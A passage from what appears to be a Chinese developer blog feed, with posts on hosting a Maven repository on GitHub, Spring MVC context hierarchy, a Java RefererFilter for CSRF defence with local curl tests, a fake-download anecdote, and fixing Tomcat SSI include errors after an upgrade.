maven仓库的使用因为github使用了raw.githubusercontent.com这个域名用于raw文件下载。所以使用这个maven仓库，只要在pom.xml里增加：123456&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;hengyunabc-maven-repo&lt;/id&gt; &lt;url&gt;https://raw.githubusercontent.com/hengyunabc/maven-repo/master/repository&lt;/url&gt; &lt;/repository&gt;&lt;/repositories&gt; maven仓库工作的机制下面介绍一些maven仓库工作的原理。典型的一个maven依赖下会有这三个文件： https://github.com/hengyunabc/maven-repo/tree/master/repository/io/github/hengyunabc/mybatis-ehcache-spring/0.0.1-SNAPSHOT123maven-metadata.xmlmaven-metadata.xml.md5maven-metadata.xml.sha1 maven-metadata.xml里面记录了最后deploy的版本和时间。 123456789101112131415&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;metadata modelVersion="1.1.0"&gt; &lt;groupId&gt;io.github.hengyunabc&lt;/groupId&gt; &lt;artifactId&gt;mybatis-ehcache-spring&lt;/artifactId&gt; &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt; &lt;versioning&gt; &lt;snapshot&gt; &lt;timestamp&gt;20150804.095005&lt;/timestamp&gt; &lt;buildNumber&gt;1&lt;/buildNumber&gt; &lt;/snapshot&gt; &lt;lastUpdated&gt;20150804095005&lt;/lastUpdated&gt; &lt;/versioning&gt;&lt;/metadata&gt; 其中md5, sha1校验文件是用来保证这个meta文件的完整性。 maven在编绎项目时，会先尝试请求maven-metadata.xml，如果没有找到，则会直接尝试请求到jar文件，在下载jar文件时也会尝试下载jar的md5, sha1文件。 maven-metadata.xml文件很重要，如果没有这个文件来指明最新的jar版本，那么即使远程仓库里的jar更新了版本，本地maven编绎时用上-U参数，也不会拉取到最新的jar！ 所以并不能简单地把jar包放到github上就完事了，一定要先在本地Deploy，生成maven-metadata.xml文件，并上传到github上。 参考：http://maven.apache.org/ref/3.2.2/maven-repository-metadata/repository-metadata.html maven的仓库关系https://maven.apache.org/repository/index.html 配置使用本地仓库想要使用本地file仓库里，在项目的pom.xml里配置，如： 123456&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;hengyunabc-maven-repo&lt;/id&gt; &lt;url&gt;file:/home/hengyunabc/code/maven-repo/repository/&lt;/url&gt; &lt;/repository&gt;&lt;/repositories&gt; 注意事项maven的repository并没有优先级的配置，也不能单独为某些依赖配置repository。所以如果项目配置了多个repository，在首次编绎时，会依次尝试下载依赖。如果没有找到，尝试下一个，整个流程会很长。 所以尽量多个依赖放同一个仓库，不要每个项目都有一个自己的仓库。 参考http://stackoverflow.com/questions/14013644/hosting-a-maven-repository-on-github/14013645#14013645http://cemerick.com/2010/08/24/hosting-maven-repos-on-github/]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>github</tag>
        <tag>maven</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[扯谈spring mvc之WebApplicationContext的继承关系]]></title>
    <url>%2Fsomething-about-spring-mvc-webapplicationcontext%2F</url>
    <content type="text"><![CDATA[spring mvc里的root/child WebApplicationContext的继承关系在传统的spring mvc程序里会有两个WebApplicationContext，一个是parent，从applicationContext.xml里加载的，一个是child，从servlet-context.xml里加载的。两者是继承关系，child WebApplicationContext 可以通过getParent()函数获取到root WebApplicationContext。 简单地说child WebApplicationContext里的bean可以注入root WebApplicationContext里的bean，而parent WebApplicationContext的bean则不能注入chile WebApplicationContext里的bean。 一个典型的web.xml的内容是： 123456789101112131415161718192021222324252627&lt;!-- The definition of the Root Spring Container shared by all Servlets and Filters --&gt;&lt;context-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;classpath*:/applicationContext.xml&lt;/param-value&gt;&lt;/context-param&gt;&lt;!-- Creates the Spring Container shared by all Servlets and Filters --&gt;&lt;listener&gt; &lt;listener-class&gt;org.springframework.web.context.ContextLoaderListener&lt;/listener-class&gt;&lt;/listener&gt;&lt;!-- Processes application requests --&gt;&lt;servlet&gt; &lt;servlet-name&gt;appServlet&lt;/servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt; &lt;init-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;/WEB-INF/servlet-context.xml&lt;/param-value&gt; &lt;/init-param&gt; &lt;load-on-startup&gt;1&lt;/load-on-startup&gt; &lt;async-supported&gt;true&lt;/async-supported&gt;&lt;/servlet&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;appServlet&lt;/servlet-name&gt; &lt;url-pattern&gt;/&lt;/url-pattern&gt;&lt;/servlet-mapping&gt; 其中root WebApplicationContext是通过listener初始化的，child WebApplicationContext是通过servlet初始化的。 而在applicationContext.xml里通常只component-scan非Controller的类，如： 123456&lt;context:component-scan base-package="io.github.test"&gt; &lt;context:exclude-filter expression="org.springframework.stereotype.Controller" type="annotation" /&gt; &lt;context:exclude-filter type="annotation" expression="org.springframework.web.bind.annotation.ControllerAdvice" /&gt;&lt;/context:component-scan&gt; 在servlet-context.xml里通常只component-scan Controller类，如： 123456&lt;context:component-scan base-package="io.github.test.web" use-default-filters="false"&gt; &lt;context:include-filter expression="org.springframework.stereotype.Controller" type="annotation" /&gt; &lt;context:include-filter type="annotation" expression="org.springframework.web.bind.annotation.ControllerAdvice" /&gt;&lt;/context:component-scan&gt; 如果不这样子分别component-scan的话，可能会出现Bean重复初始化的问题。 上面是Spring官方开始时推荐的做法。 root/child WebApplicationContext继承关系带来的麻烦root WebApplicationContext里的bean可以在不同的child WebApplicationContext里共享，而不同的child WebApplicationContext里的bean区不干扰，这个本来是个很好的设计。 但是实际上有会不少的问题： 不少开发者不知道Spring mvc里分有两个WebApplicationContext，导致各种重复构造bean，各种bean无法注入的问题。 有一些bean，比如全局的aop处理的类，如果先root WebApplicationContext里初始化了，那么child WebApplicationContext里的初始化的bean就没有处理到。如果在chile WebApplicationContext里初始化，在root WebApplicationContext里的类就没有办法注入了。 区分哪些bean放在root/child很麻烦，不小心容易搞错，而且费心思。 一劳永逸的解决办法：bean都由root WebApplicationContext加载在一次配置metrics-spring时，对配置@EnableMetrics配置在哪个WebApplicationContext里，感到很蛋疼。最终决定试下把所有的bean，包括Controller都移到root WebApplicationContext，即applicationContext.xml里加载，而servlet-context.xml里基本是空的。结果发现程序运行完全没问题。 后面在网上搜索了下，发现有一些相关的讨论： http://forum.spring.io/forum/spring-projects/container/89149-servlet-context-vs-application-context spring boot里的做法在spring boot里默认情况下不需要component-scan的配置，于是猜测在Spring boot里是不是只有一个WebApplicationContext？ 后面测试下了，发现在spring boot里默认情况下的确是只有一个WebApplicationContext： org.springframework.boot.context.embedded.AnnotationConfigEmbeddedWebApplicationContext， 所以在spring boot里省事了很多。 总结spring 的ApplicationContext继承机制是一个很好的设计，在很多其它地方都可以看到类似的思路，比如Java的class loader。但是在大部分spring web程序里，实际上只要一个WebApplicationContext就够了。如果分开rott/child WebApplicationContext会导致混乱，而没什么用。 所以推荐把所有的Service/Controller都移到root WebApplicationContext中初始化。]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>spring</tag>
        <tag>springmvc</tag>
        <tag>mvc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[怎样写一个RefererFilter]]></title>
    <url>%2Fhow-to-create-a-referer-filter%2F</url>
    <content type="text"><![CDATA[缘起首先，用检查Referer的方式来防披御CSRF并不是很好的方法。因项目临时有需要，所以做为过渡方案。 为什么判断referer不是很好的办法？ referer 可能为空 https跳转http没有referer https跳转不同的域名的https没有referer 通过特殊构造的POST请求没有referer 一些的proxy会把referer去掉 用户直接在浏览器里访问（GET请求） 判断的逻辑复杂（用正则匹配？） 友站中招，殃及池鱼 可以作为过渡方案，非长久之计 构造空referer请求的一些参考资料 Stripping Referrer for fun and profit Stripping the Referer in a Cross Domain POST request 防御CSRF目前比较好的办法是CSRF Token，参考另一篇blog：Cookie &amp; Session &amp; CSRF。 收集资料先搜索下前人有没有这类相关的工作。搜索到的关于RefererFilter的信息并不多。 不过这里学到了一些东东：https://svn.apache.org/repos/asf/sling/tags/org.apache.sling.security-1.0.0/src/main/java/org/apache/sling/security/impl/ReferrerFilter.java 是否允许localhost, 127.0.0.1这样referer的请求？ 是否允许本地的IP/host的请求？ 再搜索下java里提取request的referer的方法，还有filter里重定向请求的方法。 再仔细看了下OWASP的文档： https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet 确定方案 默认拦截“POST|PUT|DELETE|CONNECT|PATCH”的请求 HttpServletRequest里提取到referer 用java.net.URL来提取referer里的host 判断host是否符合要求，支持完全匹配的域名和子域名 不符合要求的请求回应403或者重定向到指定的页面 为什么不用正则的方式来处理referer？ 正则表达式通常比较慢 很难判断一个复杂的正则表达式是否真的正确 URL是很复杂的，不要手动处理URL，参考URL的语法 思考需要提供的配置项实际最终提供了这些配置项，考虑到像host这样的配置不是经常变动的，所以没有提供从外部配置文件加载配置的功能。123456789101112matchMethods 即拦截的方法，默认值&quot;POST|PUT|DELETE|CONNECT|PATCH&quot;，通常不用配置allowSubDomainHosts 匹配子域名，以&quot;|&quot;分隔，如&quot;test.com|abc.com&quot;， 则http://test.com, http://xxx.test.com这样的请求都会匹配到，推荐优先使用这个配置completeMatchHosts 完全匹配的域名，以&quot;|&quot;分隔，如&quot;test.com|abc.com&quot;，则只有http://test.com 这样的请求会匹配 像http://www.test.com 这样的请求不会被匹配 responseError 被拦截的请求的response的返回值，默认是403redirectPath 被拦截的请求重定向到的url，如果配置了这个值，则会忽略responseError的配置。 比如可以配置重定向到自己定义的错误页： /referer_error.htmlbAllowEmptyReferer 是否允许空referer，默认是false，除非很清楚，否则不要改动这个bAllowLocalhost 是否允许localhost, 127.0.0.1 这样的referer的请求，默认是true，便于调试bAllowAllIPAndHost 是否允许本机的所有IP和host的referer请求，默认是false 编码的细节 重定向时，注意加上contextPath 1response.sendRedirect(request.getContextPath() + redirectPath); 构造URL时，非法的URL会抛出RuntimeException，需要处理 正确地处理URL感觉这个有必要再次说明下： http://docs.oracle.com/javase/tutorial/networking/urls/urlInfo.html 用contain, indexOf, endWitch这些函数时都要小心。 1234567891011121314public static void main(String[] args) throws Exception &#123; URL aURL = new URL("http://example.com:80/docs/books/tutorial" + "/index.html?name=networking#DOWNLOADING"); System.out.println("protocol = " + aURL.getProtocol()); System.out.println("authority = " + aURL.getAuthority()); System.out.println("host = " + aURL.getHost()); System.out.println("port = " + aURL.getPort()); System.out.println("path = " + aURL.getPath()); System.out.println("query = " + aURL.getQuery()); System.out.println("filename = " + aURL.getFile()); System.out.println("ref = " + aURL.getRef()); &#125; 用curl来测试最后用curl来做了一些测试：123456curl --header &quot;Referer:http://test.com&quot; http://localhost:8080/filter-test/referercurl -X POST --header &quot;Referer:http://test.com&quot; http://localhost:8080/filter-test/referercurl -X POST --header &quot;Referer:xxxxx&quot; http://localhost:8080/filter-test/referercurl -X POST http://localhost:8080/filter-test/referercurl -X POST --header &quot;Referer:http://abc.test.com&quot; http://localhost:8080/filter-test/referercurl -X POST --header &quot;Referer:http://abc.hello.com.test.com&quot; http://localhost:8080/filter-test/referer 实现的代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252import org.slf4j.Logger;import org.slf4j.LoggerFactory; /** * &lt;pre&gt; * 支持的配置项： * matchMethods 即拦截的方法，默认值"POST|PUT|DELETE|CONNECT|PATCH"，通常不用配置 * allowSubDomainHosts 匹配子域名，以"|"分隔，如"test.com|abc.com"， * 则http://test.com, http://xxx.test.com这样的请求都会匹配到，推荐优先使用这个配置 * completeMatchHosts 完全匹配的域名，以"|"分隔，如"test.com|abc.com"，则只有http://test.com 这样的请求会匹配 * 像http://www.test.com 这样的请求不会被匹配 * * responseError 被拦截的请求的response的返回值，默认是403 * redirectPath 被拦截的请求重定向到的url，如果配置了这个值，则会忽略responseError的配置。 * 比如可以配置重定向到自己定义的错误页： /referer_error.html * bAllowEmptyReferer 是否允许空referer，默认是false，除非很清楚，否则不要改动这个 * bAllowLocalhost 是否允许localhost, 127.0.0.1 这样的referer的请求，默认是true，便于调试 * bAllowAllIPAndHost 是否允许本机的所有IP和host的referer请求，默认是false * * &#123;@code * &lt;filter&gt; * &lt;filter-name&gt;refererFilter&lt;/filter-name&gt; * &lt;filter-class&gt;com.test.RefererFilter&lt;/filter-class&gt; * &lt;init-param&gt; * &lt;param-name&gt;completeMatchHosts&lt;/param-name&gt; * &lt;param-value&gt;test.com|abc.com&lt;/param-value&gt; * &lt;/init-param&gt; * &lt;init-param&gt; * &lt;param-name&gt;allowSubDomainHosts&lt;/param-name&gt; * &lt;param-value&gt;hello.com|xxx.yyy.com&lt;/param-value&gt; * &lt;/init-param&gt; * &lt;/filter&gt; * * &lt;filter-mapping&gt; * &lt;filter-name&gt;refererFilter&lt;/filter-name&gt; * &lt;url-pattern&gt;/*&lt;/url-pattern&gt; * &lt;/filter-mapping&gt; * &#125; * &lt;/pre&gt; * * @author hengyunabc * */public class RefererFilter implements Filter &#123; static final Logger logger = LoggerFactory.getLogger(RefererFilter.class); public static final String DEFAULT_MATHMETHODS = "POST|PUT|DELETE|CONNECT|PATCH"; List&lt;String&gt; mathMethods = new ArrayList&lt;&gt;(); boolean bAllowEmptyReferer = false; boolean bAllowLocalhost = true; boolean bAllowAllIPAndHost = false; /** * when bAllowSubDomain is true, allowHosts is "test.com", then * "www.test.com", "xxx.test.com" will be allow. */ boolean bAllowSubDomain = false; String redirectPath = null; int responseError = HttpServletResponse.SC_FORBIDDEN; HashSet&lt;String&gt; completeMatchHosts = new HashSet&lt;String&gt;(); List&lt;String&gt; allowSubDomainHostList = new ArrayList&lt;String&gt;(); @Override public void init(FilterConfig filterConfig) throws ServletException &#123; mathMethods.addAll(getSplitStringList(filterConfig, "matchMethods", "\\|", DEFAULT_MATHMETHODS)); completeMatchHosts.addAll(getSplitStringList(filterConfig, "completeMatchHosts", "\\|", "")); List&lt;String&gt; allowSubDomainHosts = getSplitStringList(filterConfig, "allowSubDomainHosts", "\\|", ""); completeMatchHosts.addAll(allowSubDomainHosts); for (String host : allowSubDomainHosts) &#123; // check the first char if is '.' if (!host.isEmpty() &amp;&amp; host.charAt(0) != '.') &#123; allowSubDomainHostList.add("." + host); &#125; else &#123; allowSubDomainHostList.add(host); &#125; &#125; responseError = getInt(filterConfig, "responseError", responseError); redirectPath = filterConfig.getInitParameter("redirectPath"); bAllowEmptyReferer = getBoolean(filterConfig, "bAllowEmptyReferer", bAllowEmptyReferer); bAllowLocalhost = getBoolean(filterConfig, "bAllowLocalhost", bAllowLocalhost); if (bAllowLocalhost) &#123; completeMatchHosts.add("localhost"); completeMatchHosts.add("127.0.0.1"); completeMatchHosts.add("[::1]"); &#125; bAllowAllIPAndHost = getBoolean(filterConfig, "bAllowAllIPAndHost", bAllowAllIPAndHost); if (bAllowAllIPAndHost) &#123; completeMatchHosts.addAll(getAllIPAndHost()); &#125; &#125; @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123; if (servletRequest instanceof HttpServletRequest &amp;&amp; servletResponse instanceof HttpServletResponse) &#123; HttpServletRequest request = (HttpServletRequest) servletRequest; HttpServletResponse response = (HttpServletResponse) servletResponse; String method = request.getMethod(); /** * if method not in POST|PUT|DELETE|CONNECT|PATCH, don't check * referrer. */ if (!mathMethods.contains(method.trim().toUpperCase())) &#123; filterChain.doFilter(request, response); return; &#125; String referrer = request.getHeader("referer"); boolean bAllow = false; if (isBlank(referrer)) &#123; bAllow = bAllowEmptyReferer; &#125; else &#123; URL url = null; try &#123; url = new URL(referrer); String host = url.getHost(); if (completeMatchHosts.contains(host)) &#123; bAllow = true; &#125; else &#123; for (String domain : allowSubDomainHostList) &#123; if (host.endsWith(domain)) &#123; bAllow = true; break; &#125; &#125; &#125; &#125; catch (RuntimeException e) &#123; logger.error("illegal referrer! referrer: " + referrer, e); bAllow = false; &#125; &#125; if (bAllow) &#123; filterChain.doFilter(request, response); return; &#125; else &#123; if (isBlank(redirectPath)) &#123; response.sendError(HttpServletResponse.SC_FORBIDDEN); &#125; else &#123; response.sendRedirect(request.getContextPath() + redirectPath); &#125; &#125; &#125; else &#123; filterChain.doFilter(servletRequest, servletResponse); &#125; &#125; @Override public void destroy() &#123; &#125; private static boolean isBlank(CharSequence cs) &#123; int strLen; if (cs == null || (strLen = cs.length()) == 0) &#123; return true; &#125; for (int i = 0; i &lt; strLen; i++) &#123; if (Character.isWhitespace(cs.charAt(i)) == false) &#123; return false; &#125; &#125; return true; &#125; private static boolean getBoolean(FilterConfig filterConfig, String parameter, boolean defaultParameterValue) &#123; String parameterString = filterConfig.getInitParameter(parameter); if (parameterString == null) &#123; return defaultParameterValue; &#125; return Boolean.parseBoolean(parameterString.trim()); &#125; private static int getInt(FilterConfig filterConfig, String parameter, int defaultParameterValue) &#123; String parameterString = filterConfig.getInitParameter(parameter); if (parameterString == null) &#123; return defaultParameterValue; &#125; return Integer.parseInt(parameterString.trim()); &#125; /** * &lt;pre&gt; * getSplitStringList(filterConfig, "hosts", "\\|", "test.com|abc.com"); * * if hosts is "hello.com|google.com", will return &#123;"hello.com", google.com"&#125;. * if hosts is null, will return &#123;"test.com", "abc.com"&#125; * &lt;/pre&gt; * * @param filterConfig * @param parameter * @param regex * @param defaultParameterValue * @return */ private static List&lt;String&gt; getSplitStringList(FilterConfig filterConfig, String parameter, String regex, String defaultParameterValue) &#123; String parameterString = filterConfig.getInitParameter(parameter); if (parameterString == null) &#123; parameterString = defaultParameterValue; &#125; String[] split = parameterString.split("\\|"); if (split != null) &#123; List&lt;String&gt; resultList = new LinkedList&lt;String&gt;(); for (String method : split) &#123; resultList.add(method.trim()); &#125; return resultList; &#125; return Collections.emptyList(); &#125; public static Set&lt;String&gt; getAllIPAndHost() &#123; HashSet&lt;String&gt; resultSet = new HashSet&lt;String&gt;(); Enumeration&lt;NetworkInterface&gt; interfaces; try &#123; interfaces = NetworkInterface.getNetworkInterfaces(); while (interfaces.hasMoreElements()) &#123; NetworkInterface nic = interfaces.nextElement(); Enumeration&lt;InetAddress&gt; addresses = nic.getInetAddresses(); while (addresses.hasMoreElements()) &#123; InetAddress address = addresses.nextElement(); if (address instanceof Inet4Address) &#123; resultSet.add(address.getHostAddress()); resultSet.add(address.getHostName()); &#125; else if (address instanceof Inet6Address) &#123; // TODO how to process Inet6Address? // resultSet.add("[" + address.getHostAddress() + "]"); // resultSet.add(address.getHostName()); &#125; &#125; &#125; &#125; catch (SocketException e) &#123; logger.error("getAllIPAndHost error!", e); &#125; return resultSet; &#125;&#125; 其它的一些东东在浏览器里如何访问IPV6的地址？ 用”[]”把IPV6地址包围起来，比如localhost的：1http://[::1] 参考http://superuser.com/questions/367780/how-to-connect-a-website-has-only-ipv6-address-without-domain-name https://msdn.microsoft.com/en-us/library/windows/desktop/ms740593(v=vs.85).aspx]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>csrf</tag>
        <tag>filter</tag>
        <tag>referer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一个假链接引发的血案]]></title>
    <url>%2Fsomething-about-find-movie%2F</url>
    <content type="text"><![CDATA[以前写的一个贴子，被豆瓣小编删掉了。翻出来，聊做纪念。 一个假链接引发的血案 (2011-12-20 00:35) 某日找电影看，目标《晚秋》。 搜索 晚秋 ed2k，得到链接，1.42G，使用某工具离线下载完毕。 发现打不开，蛋疼。哥乃程序员，难到奈何不了你一小小文件。 于是用16进制方式打开，前面4个字节是CISO，搜索4349534F，发现原来是CSO格式 下载转换工具，转成ISO，虚拟光驱挂载，没有发现exe程序。 搜索“CSO”，原来是PSP镜像。 再下载PSP模拟器，加载镜像，前面能过去，后面进不去。卡在“now loading……”。 你这货也太缼德了，放个假链接也就算了，还放个不全的！ 心中甚怒，决定出终极杀器。 截图，以图搜图，终于发现是djmax black square，类似劲舞团的游戏 下载个1.6G的ISO。 终于用模拟器打开，可以玩了。。一无聊的音乐游戏。 蛋疼之余，再次无聊。决心找到真正的《晚秋》。 再次用google搜索，韩文，英文结合，最后搜索，Late Autumn dvdrip 得到种子，下载。 得到一文件： Late Autumn (Manchu) (2011) DVDRip XviD-MAX.rar 780 MB (818,395,866 字节) 双击，弹出一对话框：“输入密码”。 吐血，挣扎上床睡觉。 历时4小时+，今日记之，以警醒后人。]]></content>
      <categories>
        <category>电影</category>
      </categories>
      <tags>
        <tag>电影</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tomcat ssi配置及升级导致ssi include错误问题解决]]></title>
    <url>%2Ftomcat-ssi-problem%2F</url>
    <content type="text"><![CDATA[最近tomcat升级版本时，遇到了ssi解析的问题，记录下解决的过程，还有tomcat ssi配置的要点。 tomcat 配置SSI的两种方式Tomcat有两种方式支持SSI：Servlet和Filter。 SSIServlet通过Servlet，org.apache.catalina.ssi.SSIServlet，默认处理”*.shtml”的URL。 配置方式： 修改tomcat的 conf/web.xml文件，去掉下面配置的注释： 12345678910111213141516171819202122232425262728&lt;servlet&gt; &lt;servlet-name&gt;ssi&lt;/servlet-name&gt; &lt;servlet-class&gt; org.apache.catalina.ssi.SSIServlet &lt;/servlet-class&gt; &lt;init-param&gt; &lt;param-name&gt;buffered&lt;/param-name&gt; &lt;param-value&gt;1&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;debug&lt;/param-name&gt; &lt;param-value&gt;0&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;expires&lt;/param-name&gt; &lt;param-value&gt;666&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;isVirtualWebappRelative&lt;/param-name&gt; &lt;param-value&gt;false&lt;/param-value&gt; &lt;/init-param&gt; &lt;load-on-startup&gt;4&lt;/load-on-startup&gt;&lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;ssi&lt;/servlet-name&gt; &lt;url-pattern&gt;*.shtml&lt;/url-pattern&gt;&lt;/servlet-mapping&gt; SSIFilter通过Filter，org.apache.catalina.ssi.SSIFilter，默认处理”*.shtml”的URL。 配置方式： 修改tomcat的 conf/web.xml文件，打开去掉下面配置的注释：123456789101112131415161718192021222324252627&lt;filter&gt; &lt;filter-name&gt;ssi&lt;/filter-name&gt; &lt;filter-class&gt; org.apache.catalina.ssi.SSIFilter &lt;/filter-class&gt; &lt;init-param&gt; &lt;param-name&gt;contentType&lt;/param-name&gt; &lt;param-value&gt;text/x-server-parsed-html(;.*)?&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;debug&lt;/param-name&gt; &lt;param-value&gt;0&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;expires&lt;/param-name&gt; &lt;param-value&gt;666&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;isVirtualWebappRelative&lt;/param-name&gt; &lt;param-value&gt;false&lt;/param-value&gt; &lt;/init-param&gt;&lt;/filter&gt; &lt;filter-mapping&gt; &lt;filter-name&gt;ssi&lt;/filter-name&gt; &lt;url-pattern&gt;*.shtml&lt;/url-pattern&gt;&lt;/filter-mapping&gt; 注意事项注意：两种配置方式最好不要同时打开，除非很清楚是怎样配置的。 另外，在Tomcat的conf/context.xml里要配置privileged=”true”，否则有些SSI特性不能生效。1&lt;Context privileged="true"&gt; 历史代码里处理SSI的办法在公司的历史代码里，在一个公共的jar包里通过自定义一个EnhancedSSIServlet，继承了Tomcat的org.apache.catalina.ssi.SSIServlet来实现SSI功能的。 123456@WebServlet(name="ssi", initParams=&#123;@WebInitParam(name="buffered", value="1"), @WebInitParam(name="debug", value="0"), @WebInitParam(name="expires", value="666"), @WebInitParam(name="isVirtualWebappRelative", value="0"), @WebInitParam(name="inputEncoding", value="UTF-8"), @WebInitParam(name="outputEncoding", value="UTF-8") &#125;, loadOnStartup=1, urlPatterns=&#123;"*.shtml"&#125;, asyncSupported=true)public class EnhancedSSIServlet extends SSIServlet &#123; 其中@WebServlet是Servlet3.0规范里的，所以使用到web-common的web项目的web.xml文件都要配置为3.0版本以上，例如：1234567&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;web-app version="3.0" xmlns="http://java.sun.com/xml/ns/javaee" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"&gt; &lt;/web-app&gt; Tomcat是启动Web应用时，会扫描所有@WebServlet的类，并初始化。 所以在使用到历史代码的项目都只能使用Tomcat服务器，并且不能在tomcat的conf/web.xml里打开SSI相关的配置。 Tomcat版本升级的问题Tomcat版本从7.0.57升级到7.0.59过程中，出现了无法解析SSI include指令的错误：12345678910111213141516171819202122232425262728SEVERE: #include--Couldn't include file: /pages/test/intelFilter.shtmljava.io.IOException: Couldn't get context for path: /pages/test/intelFilter.shtml at org.apache.catalina.ssi.SSIServletExternalResolver.getServletContextAndPathFromVirtualPath(SSIServletExternalResolver.java:422) at org.apache.catalina.ssi.SSIServletExternalResolver.getServletContextAndPath(SSIServletExternalResolver.java:465) at org.apache.catalina.ssi.SSIServletExternalResolver.getFileText(SSIServletExternalResolver.java:522) at org.apache.catalina.ssi.SSIMediator.getFileText(SSIMediator.java:161) at org.apache.catalina.ssi.SSIInclude.process(SSIInclude.java:50) at org.apache.catalina.ssi.SSIProcessor.process(SSIProcessor.java:159) at com.test.webcommon.servlet.EnhancedSSIServlet.processSSI(EnhancedSSIServlet.java:72) at org.apache.catalina.ssi.SSIServlet.requestHandler(SSIServlet.java:181) at org.apache.catalina.ssi.SSIServlet.doPost(SSIServlet.java:137) at javax.servlet.http.HttpServlet.service(HttpServlet.java:646) at javax.servlet.http.HttpServlet.service(HttpServlet.java:727) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:303) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208) at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:748) at org.apache.catalina.core.ApplicationDispatcher.doInclude(ApplicationDispatcher.java:604) at org.apache.catalina.core.ApplicationDispatcher.include(ApplicationDispatcher.java:543) at org.apache.jasper.runtime.JspRuntimeLibrary.include(JspRuntimeLibrary.java:954) at org.apache.jsp.pages.lottery.jczq.index_jsp._jspService(index_jsp.java:107) at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70) at javax.servlet.http.HttpServlet.service(HttpServlet.java:727) at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:432) at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) at javax.servlet.http.HttpServlet.service(HttpServlet.java:727) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:303) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208) 仔细查看源代码后，发现不能处理的include指令代码如下：1&lt;!--#include virtual="/pages/test/intelFilter.shtml"--&gt; 经过对比调试Tomcat的代码，发现是在7.0.58版本时，改变了处理URL的方法，关键的处理函数是1org.apache.catalina.core.ApplicationContext.getContext( String uri) 在7.0.57版本前，Tomcat在处理处理像/pages/test/intelFilter.shtml这样的路径时，恰好循环处理了”/“字符，使得childContext等于StandardContext，最终由StandardContext处理了/pages/test/intelFilter.shtml的请求。 这个代码实际上是错误的，不过恰好处理了include virtual的情况。 在7.0.58版本修改了处理uri的代码，所以在升级Tomcat到7.0.59时出错了。 7.0.57版的代码：https://svn.apache.org/repos/asf/tomcat/tc7.0.x/tags/TOMCAT_7_0_57/java/org/apache/catalina/core/ApplicationContext.java123456789101112131415161718192021222324252627282930313233343536373839404142434445/** * Return a &lt;code&gt;ServletContext&lt;/code&gt; object that corresponds to a * specified URI on the server. This method allows servlets to gain * access to the context for various parts of the server, and as needed * obtain &lt;code&gt;RequestDispatcher&lt;/code&gt; objects or resources from the * context. The given path must be absolute (beginning with a "/"), * and is interpreted based on our virtual host's document root. * * @param uri Absolute URI of a resource on the server */@Overridepublic ServletContext getContext(String uri) &#123; // Validate the format of the specified argument if ((uri == null) || (!uri.startsWith("/"))) return (null); Context child = null; try &#123; Host host = (Host) context.getParent(); String mapuri = uri; while (true) &#123; child = (Context) host.findChild(mapuri); if (child != null) break; int slash = mapuri.lastIndexOf('/'); if (slash &lt; 0) break; mapuri = mapuri.substring(0, slash); &#125; &#125; catch (Throwable t) &#123; ExceptionUtils.handleThrowable(t); return (null); &#125; if (child == null) return (null); if (context.getCrossContext()) &#123; // If crossContext is enabled, can always return the context return child.getServletContext(); &#125; else if (child == context) &#123; // Can still return the current context return context.getServletContext(); &#125; else &#123; // Nothing to return return (null); &#125;&#125; 7.0.58的代码：https://svn.apache.org/repos/asf/tomcat/tc7.0.x/tags/TOMCAT_7_0_58/java/org/apache/catalina/core/ApplicationContext.java 那么正确的处理办法是怎样的？ 仔细查看Tomcat的SSI配置的说明文档，发现有一个isVirtualWebappRelative的配置，而这个配置默认是false的。1isVirtualWebappRelative - Should &quot;virtual&quot; SSI directive paths be interpreted as relative to the context root, instead of the server root? Default false. 